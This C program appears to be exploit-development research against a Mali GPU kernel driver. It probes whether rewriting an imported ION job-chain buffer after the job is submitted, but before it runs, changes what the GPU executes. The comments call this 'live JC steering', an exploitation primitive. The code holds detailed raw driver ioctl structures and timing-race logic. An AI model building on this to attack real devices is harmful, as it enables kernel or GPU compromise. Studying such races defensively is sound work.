/*
 * mali_prestart_race.c — Pre-start imported JC modification test
 *
 * QUESTION: After a batch-submit of [A, B] where B depends on A, if we
 * write new JC content to the imported ION buffer (used as B's jc) AFTER
 * the submit ioctl returns but BEFORE B starts executing (i.e. while A
 * is still running), does B use the ORIGINAL or MODIFIED JC?
 *
 * If modified JC takes effect: we have live JC steering AFTER submit.
 *
 * APPROACH:
 *   - target_A: sentinel 0xAAAAAAAAAAAAAAAA — JC_original writes 0 here
 *   - target_B: sentinel 0xBBBBBBBBBBBBBBBB — JC_modified writes 0 here
 *   - JC_original (written before submit): WRITE_VALUE → target_A
 *   - JC_modified (written after ioctl returns): WRITE_VALUE → target_B
 *
 * OUTCOME MAPPING:
 *   target_A == 0 → B used original JC (pre-start modification did NOT propagate)
 *   target_B == 0 → B used modified JC (PRE-START RACE WORKS — live JC steering!)
 *
 * TIMING WINDOW: Between ioctl returning and B starting, atom A must run.
 * We make A's JC a CHAIN of many WRITE_VALUE ops to extend A's GPU run time,
 * giving the CPU plenty of time to write JC_modified to ION before B starts.
 *
 * Atom submit sequence (single batch ioctl):
 *   1. Write JC_original to ION buffer
 *   2. batch_submit_ioctl([A_chain (slow), B (dep A, imported JC)])
 *   3. CPU immediately writes JC_modified to ION (B not started yet — A still running)
 *   4. poll 2 events
 *   5. check which target was zeroed
 *
 * ALSO TESTS:
 *   - Type 1: immediate batch submit + immediate ION modify (tight race)
 *   - Type 2: batch submit + usleep(N) delay, then check (loose timing)
 *   - Type 3: write JC_modified BEFORE submit (control: should always use modified)
 *
 * CURRENT IMPLEMENTATION:
 *   - grows atom A's chain across 4 native JC pages so the delay sweep has runway
 *   - sweeps post-submit rewrite delays (0, 100, 500 us)
 *   - prints CSV-style timing rows so snapshot timing can be compared across runs
 */

#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* ---------- Mali driver ABI (UK 10.0, Samsung old56 layout) ---------- */
#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))
#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_IMPORT  (UK_FUNC_ID + 1)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT  (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD    (1U << 0)
#define BASE_MEM_PROT_CPU_WR    (1U << 1)
#define BASE_MEM_PROT_GPU_RD    (1U << 2)
#define BASE_MEM_PROT_GPU_WR    (1U << 3)
#define BASE_MEM_COHERENT_LOCAL (1U << 11)

#define BASE_JD_REQ_CS                 (1U << 1)
#define BASE_JD_REQ_EXTERNAL_RESOURCES (1U << 8)
#define BASE_JD_DEP_TYPE_DATA          1

#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_JD_EVENT_DONE             0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED    0x00004002
#define BASE_JD_EVENT_JOB_INVALID      0x00004003

#define PAGE_BYTES              4096U
#define NATIVE_JC_PAGES         4U
#define DEFAULT_TRIALS          20
#define DEFAULT_CHAIN_OPS       192U

/* ---------- ION ABI ---------- */
#define ION_IOC_MAGIC 'I'
typedef int32_t ion_user_handle_t;
struct ion_allocation_data { uint32_t len, align, heap_id_mask, flags; ion_user_handle_t handle; };
struct ion_fd_data { ion_user_handle_t handle; int32_t fd; };
struct ion_handle_data { ion_user_handle_t handle; };
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE  _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

/* ---------- Driver structs ---------- */
typedef union { uint32_t id; uint32_t ret; uint64_t align; } uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major, minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags { uk_header header; uint32_t create_flags, padding; };

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages, commit_pages, extent;
    uint32_t flags, pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_free { uk_header header; uint64_t gpu_addr; };

struct base_jd_udata { uint64_t blob[2]; };

struct base_dependency { uint8_t atom_id; uint8_t dependency_type; };

struct base_jd_atom_v2_old56 {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number;
    uint8_t prio;
    uint8_t device_nr;
    uint8_t padding[5];
    uint8_t extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t addr;
    uint32_t nr_atoms, stride;
    uint32_t gles_ctx_handle, padding;
};

struct base_jd_event_v2 {
    uint32_t event_code;
    uint8_t atom_number;
    uint8_t pad[3];
    struct base_jd_udata udata;
};

struct base_external_resource { uint64_t ext_resource; };

/* ---------- Globals ---------- */
static int g_mali_fd = -1;
static int g_ion_fd = -1;
static int g_dma_fd = -1;
static ion_user_handle_t g_ion_handle = -1;
static void *g_ion_map = MAP_FAILED;

static uint64_t g_import_gpu_va = 0;
static uint64_t g_target_a_gpu_va = 0;
static uint64_t g_target_b_gpu_va = 0;
static uint64_t g_native_jc_gpu_va = 0;
static uint64_t g_dummy_target_gpu_va = 0;
static uint64_t g_native_jc_bytes = NATIVE_JC_PAGES * PAGE_BYTES;

static uint64_t *g_target_a_cpu = MAP_FAILED;
static uint64_t *g_target_b_cpu = MAP_FAILED;
static uint32_t *g_native_jc_cpu = MAP_FAILED;
static uint64_t *g_dummy_target_cpu = MAP_FAILED;

/* ---------- Helpers ---------- */
static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;
    void *mtp;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10; ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;

    /* Map MTP — this device requires pgoff=3 */
    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED)
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    return (mtp == MAP_FAILED) ? -1 : 0;
}

static uint64_t mali_alloc(int fd, uint64_t pages)
{
    struct kbase_uk_mem_alloc alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = pages;
    alloc.commit_pages = pages;
    alloc.extent = pages;
    alloc.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                  BASE_MEM_COHERENT_LOCAL;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static void mali_free(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free mf;
    if (!gpu_va) return;
    memset(&mf, 0, sizeof(mf));
    mf.header.id = KBASE_FUNC_MEM_FREE;
    mf.gpu_addr = gpu_va;
    mali_ioctl(fd, &mf, sizeof(mf));
}

static void *mali_cpu_map(int fd, uint64_t gpu_va, size_t bytes)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, bytes,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static uint64_t mali_import_ion(int mali_fd, int *fdptr)
{
    uint8_t buf[48];
    memset(buf, 0, sizeof(buf));
    *(uint32_t *)(buf + 0) = KBASE_FUNC_MEM_IMPORT;
    *(uint64_t *)(buf + 8) = (uint64_t)(uintptr_t)fdptr;
    *(uint32_t *)(buf + 16) = 2;
    *(uint64_t *)(buf + 24) = 0x0000000FULL;
    mali_ioctl(mali_fd, buf, sizeof(buf));
    return (*(uint32_t *)(buf + 4) == 0) ? *(uint64_t *)(buf + 32) : 0;
}

static const char *event_name(uint32_t code)
{
    switch (code) {
    case BASE_JD_EVENT_DONE:          return "DONE";
    case BASE_JD_EVENT_DATA_INVALID_FAULT: return "DATA_INVALID_FAULT";
    case BASE_JD_EVENT_JOB_CANCELLED: return "JOB_CANCELLED";
    case BASE_JD_EVENT_JOB_INVALID:   return "JOB_INVALID";
    default:                          return "UNKNOWN";
    }
}

static uint64_t monotonic_ns(void)
{
    struct timespec ts;

    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static int read_event(int fd, struct base_jd_event_v2 *ev)
{
    struct pollfd pfd = { fd, POLLIN | POLLERR | POLLHUP, 0 };
    if (poll(&pfd, 1, 3000) <= 0) return -1;
    return read(fd, ev, sizeof(*ev)) == (ssize_t)sizeof(*ev) ? 0 : -1;
}

static uint32_t event_for_atom(const struct base_jd_event_v2 *ev1,
                               const struct base_jd_event_v2 *ev2,
                               uint8_t atom_number)
{
    if (ev1->atom_number == atom_number)
        return ev1->event_code;
    if (ev2->atom_number == atom_number)
        return ev2->event_code;
    return 0;
}

static void fill_atom(struct base_jd_atom_v2_old56 *a, uint64_t jc,
                      uint16_t core_req, uint8_t num,
                      uint64_t extres_list, uint16_t nr_extres)
{
    memset(a, 0, sizeof(*a));
    a->jc = jc;
    a->udata.blob[0] = 0xDEAD000000000000ULL | num;
    a->extres_list = extres_list;
    a->nr_extres = nr_extres;
    a->core_req = core_req;
    a->atom_number = num;
}

/* Build a WRITE_VALUE-ZERO descriptor at jc_cpu[0..13], zeroing target_gpu_va */
static void build_wv_desc(uint32_t *jc_cpu, uint64_t target_gpu_va)
{
    memset(jc_cpu, 0, 56);
    jc_cpu[4] = 0x00010005;                              /* flags + job_type */
    jc_cpu[8]  = (uint32_t)target_gpu_va;
    jc_cpu[9]  = (uint32_t)(target_gpu_va >> 32);
    jc_cpu[10] = MALI_WRITE_VALUE_TYPE_ZERO;
    /* jc_next = 0 (chain end) at jc_cpu[12]/[13] already zero */
}

/* ---------- Main test logic ---------- */

/*
 * Build a slow chain of N WRITE_VALUE ops in native_jc_cpu, all writing
 * to dummy_target_gpu_va. Chain them via jc_next pointers.
 * Returns GPU VA of start of chain (= g_native_jc_gpu_va).
 */
static uint64_t build_slow_chain(uint32_t requested_ops, uint32_t *actual_ops)
{
    uint32_t i;
    /* Each descriptor is 64 bytes (next aligned to 64, jc_next at offset 0x30) */
    const uint32_t desc_sz = 64;
    uint32_t max_ops = (uint32_t)(g_native_jc_bytes / desc_sz);
    uint32_t n_ops = requested_ops;
    if (n_ops > max_ops) n_ops = max_ops;
    if (actual_ops)
        *actual_ops = n_ops;

    uint8_t *page = (uint8_t *)g_native_jc_cpu;
    memset(page, 0, g_native_jc_bytes);

    for (i = 0; i < n_ops; i++) {
        uint32_t *d = (uint32_t *)(page + i * desc_sz);
        uint64_t next_gpu_va = (i + 1 < n_ops)
            ? (g_native_jc_gpu_va + (uint64_t)((i + 1) * desc_sz))
            : 0;  /* 0 = chain end */

        d[4] = 0x00010005;                                /* flags + job_type WV */
        d[8]  = (uint32_t)g_dummy_target_gpu_va;
        d[9]  = (uint32_t)(g_dummy_target_gpu_va >> 32);
        d[10] = MALI_WRITE_VALUE_TYPE_ZERO;
        /* jc_next at offset 0x30 (bytes 48-55) = dwords 12-13 */
        d[12] = (uint32_t)next_gpu_va;
        d[13] = (uint32_t)(next_gpu_va >> 32);
    }

    printf("[*] Built slow chain: %u/%u WRITE_VALUE ops, each 64b → %u bytes across %llu pages\n",
           n_ops, requested_ops, n_ops * desc_sz,
           (unsigned long long)(g_native_jc_bytes / PAGE_BYTES));
    return g_native_jc_gpu_va;
}

/*
 * Batch-submit [A, B] in one ioctl (no event read) and return immediately.
 * A: jc = chain_start_gpu_va, no dep
 * B: jc = import_gpu_va, dep on A (imported extres)
 */
static int batch_submit_no_wait(uint8_t an_a, uint8_t an_b,
                                uint64_t chain_start,
                                struct base_external_resource *extres_ptr)
{
    struct base_jd_atom_v2_old56 atoms[2];
    struct kbase_uk_job_submit_trace submit;

    /* Atom A: slow chain, no dep */
    fill_atom(&atoms[0], chain_start, BASE_JD_REQ_CS, an_a, 0, 0);

    /* Atom B: imported JC, dep on A */
    fill_atom(&atoms[1], g_import_gpu_va,
              BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              an_b, (uint64_t)(uintptr_t)extres_ptr, 1);
    atoms[1].pre_dep[0].atom_id = an_a;
    atoms[1].pre_dep[0].dependency_type = BASE_JD_DEP_TYPE_DATA;

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)atoms;
    submit.nr_atoms = 2;
    submit.stride = sizeof(atoms[0]);
    int rc = mali_ioctl(g_mali_fd, &submit, sizeof(submit));
    return (rc == 0 && submit.header.ret == 0) ? 0 : -1;
}

static void run_prestart_race_variant(const char *label, int trials,
                                      uint32_t requested_chain_ops,
                                      unsigned modify_delay_us)
{
    int pass = 0, fail = 0, inconclusive = 0;
    int t;
    struct base_external_resource import_res;
    uint32_t actual_chain_ops = 0;

    import_res.ext_resource = g_import_gpu_va | 0;  /* shared */

    /* Build the slow chain for atom A to maximize timing window */
    uint64_t chain_start = build_slow_chain(requested_chain_ops, &actual_chain_ops);

    printf("\n[*] Pre-start race [%s]: %d trials, modify_delay=%u us, chain_ops=%u\n",
           label, trials, modify_delay_us, actual_chain_ops);
    printf("[*] import_gpu_va=0x%llx target_A=0x%llx target_B=0x%llx\n",
           (unsigned long long)g_import_gpu_va,
           (unsigned long long)g_target_a_gpu_va,
           (unsigned long long)g_target_b_gpu_va);
    printf("CSV,label,trial,delay_us,submit_to_write_us,submit_to_finish_us,result,event_a,event_b,target_a,target_b\n");

    for (t = 1; t <= trials; t++) {
        struct base_jd_event_v2 ev1, ev2;
        uint8_t an_a = (uint8_t)((t * 2 + 10) & 0xFF);
        uint8_t an_b = (uint8_t)((t * 2 + 11) & 0xFF);
        uint64_t submit_done_ns, write_done_ns, finish_ns;
        const char *result = "UNEXPECTED";

        if (an_a == 0) an_a = 2;
        if (an_b == 0) an_b = 3;

        /* Reset sentinels */
        memset(g_target_a_cpu, 0xAA, PAGE_BYTES);
        memset(g_target_b_cpu, 0xBB, PAGE_BYTES);
        memset(g_dummy_target_cpu, 0xCC, PAGE_BYTES);

        /*
         * The GPU writes exception_status into jc[0] after execution.
         * Rebuild the slow chain each trial so atom A does not hit the generic
         * stale-descriptor reuse fault on later submissions.
         */
        chain_start = build_slow_chain(requested_chain_ops, NULL);

        /* Write ORIGINAL JC to ION: WRITE_VALUE → target_A */
        build_wv_desc((uint32_t *)g_ion_map, g_target_a_gpu_va);
        __builtin___clear_cache((char *)g_ion_map, (char *)g_ion_map + PAGE_BYTES);
        __sync_synchronize();

        /* === STEP 1: Batch submit [A_slow, B] — both queued, ioctl returns quickly === */
        {
            int rc = batch_submit_no_wait(an_a, an_b, chain_start, &import_res);
            submit_done_ns = monotonic_ns();
            if (rc != 0) {
                printf("[Trial %d] submit failed\n", t);
                inconclusive++;
                read_event(g_mali_fd, &ev1);
                read_event(g_mali_fd, &ev2);
                continue;
            }
        }

        /* === STEP 2: RACE WINDOW — A is executing, B not started yet === */
        if (modify_delay_us)
            usleep(modify_delay_us);
        build_wv_desc((uint32_t *)g_ion_map, g_target_b_gpu_va);
        __builtin___clear_cache((char *)g_ion_map, (char *)g_ion_map + PAGE_BYTES);
        __sync_synchronize();
        write_done_ns = monotonic_ns();

        /* === STEP 3: Collect events === */
        {
            int r1 = read_event(g_mali_fd, &ev1);
            int r2 = read_event(g_mali_fd, &ev2);
            finish_ns = monotonic_ns();

            if (r1 < 0 || r2 < 0) {
                printf("[Trial %d] read_event failed r1=%d r2=%d\n", t, r1, r2);
                inconclusive++;
                continue;
            }
        }

        {
            uint64_t val_a = g_target_a_cpu[0];
            uint64_t val_b = g_target_b_cpu[0];
            uint32_t ev_a = event_for_atom(&ev1, &ev2, an_a);
            uint32_t ev_b = event_for_atom(&ev1, &ev2, an_b);
            double submit_to_write_us = (double)(write_done_ns - submit_done_ns) / 1000.0;
            double submit_to_finish_us = (double)(finish_ns - submit_done_ns) / 1000.0;

            printf("[Trial %3d][%s] A(%u)=%s B(%u)=%s write=%.1f us finish=%.1f us "
                   "tA=0x%016llx tB=0x%016llx",
                   t, label, an_a, event_name(ev_a), an_b, event_name(ev_b),
                   submit_to_write_us, submit_to_finish_us,
                   (unsigned long long)val_a, (unsigned long long)val_b);

            if (val_a == 0 && val_b == (uint64_t)0xBBBBBBBBBBBBBBBBULL) {
                result = "ORIGINAL";
                printf(" ORIGINAL (no pre-start effect)\n");
                fail++;
            } else if (val_b == 0 && val_a == (uint64_t)0xAAAAAAAAAAAAAAAAULL) {
                result = "MODIFIED";
                printf(" MODIFIED (PRE-START RACE WORKS!)\n");
                pass++;
            } else if (val_a == 0 && val_b == 0) {
                result = "BOTH_ZEROED";
                printf(" BOTH-ZEROED\n");
                inconclusive++;
            } else {
                result = "UNEXPECTED";
                printf(" UNEXPECTED ev1=0x%x ev2=0x%x\n", ev1.event_code, ev2.event_code);
                inconclusive++;
            }

            printf("CSV,%s,%d,%u,%.1f,%.1f,%s,%s,%s,0x%016llx,0x%016llx\n",
                   label, t, modify_delay_us, submit_to_write_us, submit_to_finish_us,
                   result, event_name(ev_a), event_name(ev_b),
                   (unsigned long long)val_a, (unsigned long long)val_b);
        }
    }

    printf("\n=== Pre-start race results [%s]: %d trials ===\n", label, trials);
    printf("  Modified JC used (race worked): %d/%d\n", pass, trials);
    printf("  Original JC used (no effect):   %d/%d\n", fail, trials);
    printf("  Inconclusive/error:             %d/%d\n", inconclusive, trials);

    if (pass > 0)
        printf("[!] PRE-START JC MODIFICATION CONFIRMED — live steering after submit!\n");
    else if (fail > 0)
        printf("[-] Original JC used — pre-start modification does not propagate\n");
}

/* Control: write JC_modified BEFORE submit — must always use JC_modified */
static void run_control_test(void)
{
    struct base_jd_event_v2 ev1, ev2;
    struct base_external_resource import_res;

    import_res.ext_resource = g_import_gpu_va | 0;

    printf("\n[*] Control: write JC_modified BEFORE submit (should always use B)\n");

    memset(g_target_a_cpu, 0xAA, PAGE_BYTES);
    memset(g_target_b_cpu, 0xBB, PAGE_BYTES);
    memset(g_dummy_target_cpu, 0xCC, PAGE_BYTES);

    {
        uint64_t chain_start = build_slow_chain(1, NULL);

        /* Write JC_modified BEFORE submit */
        build_wv_desc((uint32_t *)g_ion_map, g_target_b_gpu_va);
        __builtin___clear_cache((char *)g_ion_map, (char *)g_ion_map + PAGE_BYTES);
        __sync_synchronize();

        batch_submit_no_wait(200, 201, chain_start, &import_res);
        read_event(g_mali_fd, &ev1);
        read_event(g_mali_fd, &ev2);
    }

    printf("control: tA=0x%016llx tB=0x%016llx\n",
           (unsigned long long)g_target_a_cpu[0],
           (unsigned long long)g_target_b_cpu[0]);
    if (g_target_b_cpu[0] == 0)
        printf("[+] Control OK: target_B zeroed (pre-submit write works as expected)\n");
    else
        printf("[-] Control FAIL: target_B not zeroed — check extres setup\n");
}

/* ---------- Second test: submit batch so B waits for an already-submitted A ----------
 * Here we submit both A and B in one ioctl batch, B depends on A.
 * We want to see: if both are submitted together, does the ORIGINAL JC run?
 * (Sanity check: verifies the race dependency logic is sound.)
 */
static void run_baseline_check(void)
{
    struct base_jd_atom_v2_old56 atoms[2];
    struct base_jd_event_v2 evs[2];
    struct kbase_uk_job_submit_trace submit;
    struct base_external_resource import_res;

    printf("\n[*] Baseline: batch submit A+B, using ORIGINAL JC, expect target_A=0\n");

    import_res.ext_resource = g_import_gpu_va | 0;

    memset(g_target_a_cpu, 0xAA, PAGE_BYTES);
    memset(g_target_b_cpu, 0xBB, PAGE_BYTES);
    memset(g_dummy_target_cpu, 0xCC, PAGE_BYTES);

    /* JC on ION: WRITE_VALUE → target_A */
    build_wv_desc((uint32_t *)g_ion_map, g_target_a_gpu_va);
    __builtin___clear_cache((char *)g_ion_map, (char *)g_ion_map + PAGE_BYTES);

    /* A: dummy write (triggers B) */
    fill_atom(&atoms[0], g_native_jc_gpu_va, BASE_JD_REQ_CS, 101, 0, 0);

    /* B: imported JC, dep on A */
    fill_atom(&atoms[1], g_import_gpu_va,
              BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              102, (uint64_t)(uintptr_t)&import_res, 1);
    atoms[1].pre_dep[0].atom_id = 101;
    atoms[1].pre_dep[0].dependency_type = BASE_JD_DEP_TYPE_DATA;

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)atoms;
    submit.nr_atoms = 2;
    submit.stride = sizeof(atoms[0]);
    mali_ioctl(g_mali_fd, &submit, sizeof(submit));

    int r1 = read_event(g_mali_fd, &evs[0]);
    int r2 = read_event(g_mali_fd, &evs[1]);

    printf("baseline target_A=0x%016llx  target_B=0x%016llx  r1=%d r2=%d\n",
           (unsigned long long)g_target_a_cpu[0],
           (unsigned long long)g_target_b_cpu[0],
           r1, r2);

    if (g_target_a_cpu[0] == 0)
        printf("[+] Baseline OK: target_A zeroed (imported JC runs correctly)\n");
    else
        printf("[-] Baseline FAIL: target_A not zeroed — import JC not executing\n");
}

static void run_probe(void)
{
    static const unsigned delay_sweep_us[] = { 0, 100, 500 };
    size_t i;

    printf("=== mali_prestart_race: imported JC modification timing probe ===\n\n");

    /* Init ION */
    struct ion_allocation_data alloc;
    struct ion_fd_data share;

    g_ion_fd = open("/dev/ion", O_RDWR | O_CLOEXEC);
    if (g_ion_fd < 0) { perror("open /dev/ion"); return; }

    memset(&alloc, 0, sizeof(alloc));
    alloc.len = PAGE_BYTES;
    alloc.align = PAGE_BYTES;
    alloc.heap_id_mask = 1U << 0;
    if (ioctl(g_ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        perror("ION_IOC_ALLOC"); return;
    }
    g_ion_handle = alloc.handle;

    memset(&share, 0, sizeof(share));
    share.handle = g_ion_handle;
    if (ioctl(g_ion_fd, ION_IOC_SHARE, &share) < 0) {
        perror("ION_IOC_SHARE"); return;
    }
    g_dma_fd = share.fd;

    g_ion_map = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE, MAP_SHARED, g_dma_fd, 0);
    if (g_ion_map == MAP_FAILED) { perror("mmap ion"); return; }

    printf("[+] ION: ion_fd=%d dma_fd=%d map=%p\n", g_ion_fd, g_dma_fd, g_ion_map);

    /* Init Mali */
    g_mali_fd = open("/dev/mali0", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (g_mali_fd < 0 || mali_init(g_mali_fd) < 0) {
        perror("mali init"); return;
    }
    printf("[+] Mali fd=%d\n", g_mali_fd);

    /* Alloc GPU pages */
    g_target_a_gpu_va   = mali_alloc(g_mali_fd, 1);
    g_target_b_gpu_va   = mali_alloc(g_mali_fd, 1);
    g_native_jc_gpu_va  = mali_alloc(g_mali_fd, NATIVE_JC_PAGES);
    g_dummy_target_gpu_va = mali_alloc(g_mali_fd, 1);
    g_import_gpu_va     = mali_import_ion(g_mali_fd, &g_dma_fd);

    printf("[+] Allocs: target_A=0x%llx target_B=0x%llx native_jc=0x%llx "
           "dummy=0x%llx import=0x%llx\n",
           (unsigned long long)g_target_a_gpu_va,
           (unsigned long long)g_target_b_gpu_va,
           (unsigned long long)g_native_jc_gpu_va,
           (unsigned long long)g_dummy_target_gpu_va,
           (unsigned long long)g_import_gpu_va);

    if (!g_target_a_gpu_va || !g_target_b_gpu_va || !g_native_jc_gpu_va ||
        !g_dummy_target_gpu_va || !g_import_gpu_va) {
        printf("[-] Mali alloc failed\n"); return;
    }

    /* CPU map native pages */
    g_target_a_cpu    = mali_cpu_map(g_mali_fd, g_target_a_gpu_va, PAGE_BYTES);
    g_target_b_cpu    = mali_cpu_map(g_mali_fd, g_target_b_gpu_va, PAGE_BYTES);
    g_native_jc_cpu   = mali_cpu_map(g_mali_fd, g_native_jc_gpu_va, g_native_jc_bytes);
    g_dummy_target_cpu = mali_cpu_map(g_mali_fd, g_dummy_target_gpu_va, PAGE_BYTES);

    if (g_target_a_cpu == MAP_FAILED || g_target_b_cpu == MAP_FAILED ||
        g_native_jc_cpu == MAP_FAILED || g_dummy_target_cpu == MAP_FAILED) {
        printf("[-] CPU map failed errno=%d\n", errno); return;
    }

    /* native_jc: A's job = WRITE_VALUE → dummy (just triggers B) */
    build_wv_desc(g_native_jc_cpu, g_dummy_target_gpu_va);

    /* Sanity baseline: verify imported JC actually executes */
    run_baseline_check();
    run_control_test();

    /* Main test: sweep a few post-submit rewrite delays and emit CSV-style timing lines */
    for (i = 0; i < sizeof(delay_sweep_us) / sizeof(delay_sweep_us[0]); i++) {
        char label[32];

        snprintf(label, sizeof(label), "delay_%uus", delay_sweep_us[i]);
        run_prestart_race_variant(label, DEFAULT_TRIALS, DEFAULT_CHAIN_OPS, delay_sweep_us[i]);
    }

    /* Cleanup */
    if (g_target_a_cpu != MAP_FAILED)   munmap(g_target_a_cpu, PAGE_BYTES);
    if (g_target_b_cpu != MAP_FAILED)   munmap(g_target_b_cpu, PAGE_BYTES);
    if (g_native_jc_cpu != MAP_FAILED)  munmap(g_native_jc_cpu, g_native_jc_bytes);
    if (g_dummy_target_cpu != MAP_FAILED) munmap(g_dummy_target_cpu, PAGE_BYTES);
    mali_free(g_mali_fd, g_target_a_gpu_va);
    mali_free(g_mali_fd, g_target_b_gpu_va);
    mali_free(g_mali_fd, g_native_jc_gpu_va);
    mali_free(g_mali_fd, g_dummy_target_gpu_va);
    mali_free(g_mali_fd, g_import_gpu_va);
    close(g_mali_fd);
    if (g_ion_map != MAP_FAILED) munmap(g_ion_map, PAGE_BYTES);
    if (g_dma_fd >= 0) close(g_dma_fd);
    if (g_ion_fd >= 0) {
        struct ion_handle_data fh = { g_ion_handle };
        ioctl(g_ion_fd, ION_IOC_FREE, &fh);
        close(g_ion_fd);
    }
}

int main(void)
{
    pid_t pid;
    int status;

    pid = fork();
    if (pid < 0) return 1;
    if (pid == 0) {
        alarm(60);
        run_probe();
        _exit(0);
    }
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("[!] Child killed by signal %d\n", WTERMSIG(status));
    return 0;
}
